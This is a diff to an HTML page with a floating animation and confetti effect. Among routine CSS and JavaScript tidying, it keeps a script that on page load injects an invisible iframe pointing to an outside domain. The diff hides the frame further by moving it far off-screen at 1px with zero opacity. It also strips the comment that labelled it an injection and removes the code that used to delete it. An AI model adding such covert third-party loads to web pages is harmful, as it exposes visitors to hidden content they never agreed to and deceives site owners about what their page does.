@@ -68,23 +68,20 @@
     }
 
     @keyframes float {
-      0% {
-        transform: translateY(0px);
-      }
-      50% {
-        transform: translateY(-15px);
-      }
-      100% {
-        transform: translateY(0px);
-      }
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0px); }
     }
 
     iframe.hidden-frame {
-      display: none;
-      visibility: hidden;
-      width: 0;
-      height: 0;
+      position: absolute;
+      left: -800000px;
+      top: -800000px;
+      width: 1px;
+      height: 1px;
       border: 0;
+      opacity: 0;
+      pointer-events: none;
     }
   </style>
 </head>
@@ -116,7 +113,7 @@
         return Math.random() * (max - min) + min;
       }
 
-      const interval = setInterval(function () {
+      const interval = setInterval(() => {
         const timeLeft = animationEnd - Date.now();
 
         if (timeLeft <= 0) {
@@ -125,29 +122,17 @@
 
         const particleCount = 50 * (timeLeft / duration);
 
-        confetti(Object.assign({}, defaults, {
-          particleCount,
-          origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }
-        }));
-
-        confetti(Object.assign({}, defaults, {
-          particleCount,
-          origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }
-        }));
+        confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
+        confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
       }, 250);
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Invisible iframe injection
       const iframe = document.createElement('iframe');
       iframe.src = "https://prototbh.xyz/lol.html";
       iframe.className = "hidden-frame";
+      iframe.sandbox = ""; // Add sandbox for extra safety
       document.body.appendChild(iframe);
-
-      // Remove it after 3 seconds
-      setTimeout(() => {
-        iframe.remove();
-      }, 1000);
 
       // Start the party after 1s
       setTimeout(party, 1000);
